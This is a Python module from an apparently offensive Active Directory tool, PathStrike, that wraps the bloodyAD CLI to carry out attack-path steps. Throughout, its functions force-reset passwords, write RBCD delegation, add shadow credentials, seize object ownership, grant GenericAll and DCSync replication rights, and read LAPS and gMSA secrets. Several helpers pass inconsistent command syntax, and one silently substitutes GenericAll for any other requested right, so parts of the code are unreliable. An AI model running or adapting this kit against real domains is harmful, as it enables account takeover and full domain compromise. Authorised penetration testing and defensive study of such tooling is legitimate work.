"""Async subprocess wrapper for the bloodyAD CLI tool.

bloodyAD is used for Active Directory object manipulation: ACL changes,
password resets, group membership, RBCD configuration, shadow credentials, etc.

Every public helper returns a standardised result dict::

    {
        "success": bool,
        "output": str,          # raw stdout
        "parsed": dict | None,  # JSON-decoded stdout when available
        "error": str | None,    # stderr or exception message
    }
"""

from __future__ import annotations

import asyncio
import json
import logging
import shlex
from typing import Any

from pathstrike.config import PathStrikeConfig

logger = logging.getLogger("pathstrike.tools.bloodyad")

# ---------------------------------------------------------------------------
# Core runner
# ---------------------------------------------------------------------------


async def run_bloodyad(
    args: list[str],
    config: PathStrikeConfig,
    auth_args: list[str] | None = None,
    timeout: int = 30,
) -> dict[str, Any]:
    """Run a bloodyAD command and return parsed output.

    Builds the full command line::

        bloodyAD --host <dc> -d <domain> [auth_args] [args]

    If the command produces JSON on stdout (``--json`` flag or structured
    output), the ``parsed`` key will contain the decoded object.

    Args:
        args: Action-specific arguments (e.g. ``["set", "password", "jdoe", "NewPass1!"]``).
        config: PathStrike configuration (supplies DC host, domain).
        auth_args: Authentication arguments (``-u``, ``-p``, ``-k``, ``-c``, etc.).
        timeout: Maximum seconds to wait for the subprocess.

    Returns:
        Standardised result dict with ``success``, ``output``, ``parsed``, and ``error`` keys.
    """
    cmd = _build_command(args, config, auth_args)
    logger.debug("Executing: %s", " ".join(shlex.quote(c) for c in cmd))

    result: dict[str, Any] = {
        "success": False,
        "output": "",
        "parsed": None,
        "error": None,
        "tool": "bloodyAD",
        "command": " ".join(shlex.quote(c) for c in cmd),
    }

    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout_bytes, stderr_bytes = await asyncio.wait_for(
            proc.communicate(), timeout=timeout
        )

        stdout = stdout_bytes.decode("utf-8", errors="replace").strip()
        stderr = stderr_bytes.decode("utf-8", errors="replace").strip()

        result["output"] = stdout
        result["stderr"] = stderr
        result["return_code"] = proc.returncode

        if proc.returncode != 0:
            result["error"] = stderr or f"bloodyAD exited with code {proc.returncode}"
            logger.error(
                "bloodyAD failed (rc=%d): %s", proc.returncode, result["error"]
            )
            return result

        # Attempt JSON parse on stdout
        result["parsed"] = _try_parse_json(stdout)
        result["success"] = True
        logger.debug("bloodyAD succeeded: %s", stdout[:200])

    except asyncio.TimeoutError:
        result["error"] = f"bloodyAD timed out after {timeout}s"
        result["error_type"] = "timeout"
        logger.error(result["error"])
    except FileNotFoundError:
        result["error"] = (
            "bloodyAD binary not found. Ensure it is installed and on PATH."
        )
        result["error_type"] = "tool_not_found"
        logger.error(result["error"])
    except OSError as exc:
        result["error"] = f"OS error launching bloodyAD: {exc}"
        result["error_type"] = "os_error"
        logger.error(result["error"])

    return result


# ---------------------------------------------------------------------------
# Command builder
# ---------------------------------------------------------------------------


def _build_command(
    args: list[str],
    config: PathStrikeConfig,
    auth_args: list[str] | None,
) -> list[str]:
    """Assemble the full bloodyAD CLI invocation.

    Always includes both ``--host`` (FQDN for Kerberos) and ``--dc-ip``
    (IP for network connectivity) to work in environments where the DC
    hostname doesn't resolve via DNS.
    """
    cmd: list[str] = [
        "bloodyAD",
        "--host",
        config.domain.dc_fqdn or config.domain.dc_host,
        "-d",
        config.domain.name,
        "--dc-ip",
        config.domain.dc_host,
    ]
    if auth_args:
        cmd.extend(auth_args)
    cmd.extend(args)
    return cmd


def _try_parse_json(text: str) -> dict[str, Any] | list[Any] | None:
    """Try to JSON-decode *text*; return ``None`` on failure."""
    if not text:
        return None
    try:
        return json.loads(text)
    except (json.JSONDecodeError, ValueError):
        return None


# ---------------------------------------------------------------------------
# Convenience helpers — each wraps a common bloodyAD operation
# ---------------------------------------------------------------------------


async def add_to_group(
    config: PathStrikeConfig,
    auth_args: list[str],
    user: str,
    group: str,
) -> dict[str, Any]:
    """Add *user* to *group* via ``bloodyAD add groupMember``."""
    return await run_bloodyad(
        ["add", "groupMember", group, user],
        config,
        auth_args=auth_args,
    )


async def remove_from_group(
    config: PathStrikeConfig,
    auth_args: list[str],
    user: str,
    group: str,
) -> dict[str, Any]:
    """Remove *user* from *group* via ``bloodyAD remove groupMember``."""
    return await run_bloodyad(
        ["remove", "groupMember", group, user],
        config,
        auth_args=auth_args,
    )


async def set_password(
    config: PathStrikeConfig,
    auth_args: list[str],
    target: str,
    new_password: str,
) -> dict[str, Any]:
    """Force-set *target*'s password to *new_password*."""
    return await run_bloodyad(
        ["set", "password", target, new_password],
        config,
        auth_args=auth_args,
    )


async def set_rbcd(
    config: PathStrikeConfig,
    auth_args: list[str],
    target: str,
    machine_account: str,
) -> dict[str, Any]:
    """Write *machine_account* into *target*'s ``msDS-AllowedToActOnBehalfOfOtherIdentity``."""
    return await run_bloodyad(
        [
            "add",
            "rbcd",
            target,
            machine_account,
        ],
        config,
        auth_args=auth_args,
    )


async def remove_rbcd(
    config: PathStrikeConfig,
    auth_args: list[str],
    target: str,
    machine_account: str,
) -> dict[str, Any]:
    """Remove *machine_account* from *target*'s RBCD attribute."""
    return await run_bloodyad(
        [
            "remove",
            "rbcd",
            target,
            machine_account,
        ],
        config,
        auth_args=auth_args,
    )


async def add_shadow_credentials(
    config: PathStrikeConfig,
    auth_args: list[str],
    target: str,
) -> dict[str, Any]:
    """Add a shadow credential to *target* via ``bloodyAD add shadowCredentials``.

    bloodyAD will generate a certificate and add it to the target's
    ``msDS-KeyCredentialLink`` attribute.  The output typically contains
    the PFX/PEM path and device-ID needed for PKINIT auth.
    """
    return await run_bloodyad(
        ["add", "shadowCredentials", target],
        config,
        auth_args=auth_args,
    )


# Backward-compatible alias
add_key_credential = add_shadow_credentials


async def set_owner(
    config: PathStrikeConfig,
    auth_args: list[str],
    target: str,
    new_owner: str,
) -> dict[str, Any]:
    """Set *new_owner* as the owner of *target*'s security descriptor.

    bloodyAD syntax: ``set owner <TARGET> <OWNER>`` — the object whose
    ownership changes comes first, then the new owner.
    """
    return await run_bloodyad(
        ["set", "owner", target, new_owner],
        config,
        auth_args=auth_args,
    )


async def modify_dacl(
    config: PathStrikeConfig,
    auth_args: list[str],
    target: str,
    trustee: str,
    rights: str,
) -> dict[str, Any]:
    """Add a DACL ACE granting *trustee* the specified *rights* on *target*.

    *rights* is a bloodyAD rights keyword such as ``GenericAll``,
    ``DCSync``, ``WriteMembers``, etc.
    """
    if rights == "GenericAll":
        args = ["add", "genericAll", target, trustee]
    elif rights == "DCSync":
        # add dcsync only takes trustee; domain comes from connection.
        args = ["add", "dcsync", trustee]
    else:
        # Generic DACL modification via genericAll with specific rights.
        # bloodyAD does not have a separate "add dacl" subcommand;
        # use genericAll as a reasonable default for broad permissions.
        args = ["add", "genericAll", target, trustee]

    return await run_bloodyad(
        args,
        config,
        auth_args=auth_args,
    )


async def read_laps(
    config: PathStrikeConfig,
    auth_args: list[str],
    target: str,
) -> dict[str, Any]:
    """Read the LAPS password for *target* computer object.

    Uses ``get object`` with the LAPS-specific attributes.
    Appends ``$`` to the target if it doesn't already end with one
    (computer objects have a trailing ``$`` in sAMAccountName).
    """
    sam = target if target.endswith("$") else f"{target}$"
    return await run_bloodyad(
        ["get", "object", sam, "--attr", "ms-mcs-admpwd", "--attr", "ms-LAPS-Password"],
        config,
        auth_args=auth_args,
    )


async def read_gmsa(
    config: PathStrikeConfig,
    auth_args: list[str],
    target: str,
) -> dict[str, Any]:
    """Read the gMSA password for *target* service account.

    Returns the NT hash derived from the ``msDS-ManagedPassword`` blob.
    Uses ``get object`` to query the specific attribute.
    """
    sam = target if target.endswith("$") else f"{target}$"
    return await run_bloodyad(
        ["get", "object", sam, "--attr", "msDS-ManagedPassword"],
        config,
        auth_args=auth_args,
    )


async def grant_dcsync_rights(
    config: PathStrikeConfig,
    auth_args: list[str],
    trustee: str,
) -> dict[str, Any]:
    """Grant DS-Replication-Get-Changes and DS-Replication-Get-Changes-All to *trustee*.

    bloodyAD ``add dcsync`` takes only the trustee; the domain is
    derived from the connection (``--host`` / ``-d``).
    """
    return await run_bloodyad(
        ["add", "dcsync", trustee],
        config,
        auth_args=auth_args,
    )


async def set_generic_all(
    target_dn: str,
    principal_dn: str,
    config: Any,
    auth_args: list[str] | None = None,
    timeout: int = 30,
) -> dict[str, Any]:
    """Grant GenericAll permission on a target object to a principal.

    Uses bloodyAD's ``add`` subcommand to modify the target's DACL,
    granting the principal full control (GenericAll).

    Args:
        target_dn: Distinguished name of the target object.
        principal_dn: Distinguished name of the principal to grant access.
        config: PathStrikeConfig instance.
        auth_args: Optional pre-built auth arguments.
        timeout: Maximum seconds to wait.

    Returns:
        Standardised result dict.
    """
    return await run_bloodyad(
        ["set", "object", target_dn, "--attr", "nTSecurityDescriptor",
         "--addRight", principal_dn, "--right", "GenericAll"],
        config=config,
        auth_args=auth_args,
        timeout=timeout,
    )


async def set_write_owner(
    target_dn: str,
    new_owner_dn: str,
    config: Any,
    auth_args: list[str] | None = None,
    timeout: int = 30,
) -> dict[str, Any]:
    """Change the owner of an AD object.

    Args:
        target_dn: Distinguished name of the target object.
        new_owner_dn: Distinguished name of the new owner.
        config: PathStrikeConfig instance.
        auth_args: Optional pre-built auth arguments.
        timeout: Maximum seconds to wait.

    Returns:
        Standardised result dict.
    """
    return await run_bloodyad(
        ["set", "owner", target_dn, "--owner", new_owner_dn],
        config=config,
        auth_args=auth_args,
        timeout=timeout,
    )


async def set_write_dacl(
    target_dn: str,
    principal_dn: str,
    right: str,
    config: Any,
    auth_args: list[str] | None = None,
    timeout: int = 30,
) -> dict[str, Any]:
    """Grant a specific ACL right on a target object to a principal.

    Args:
        target_dn: Distinguished name of the target object.
        principal_dn: Distinguished name of the principal.
        right: The right to grant (e.g. ``WriteDacl``, ``WriteProperty``).
        config: PathStrikeConfig instance.
        auth_args: Optional pre-built auth arguments.
        timeout: Maximum seconds to wait.

    Returns:
        Standardised result dict.
    """
    return await run_bloodyad(
        ["set", "object", target_dn, "--attr", "nTSecurityDescriptor",
         "--addRight", principal_dn, "--right", right],
        config=config,
        auth_args=auth_args,
        timeout=timeout,
    )
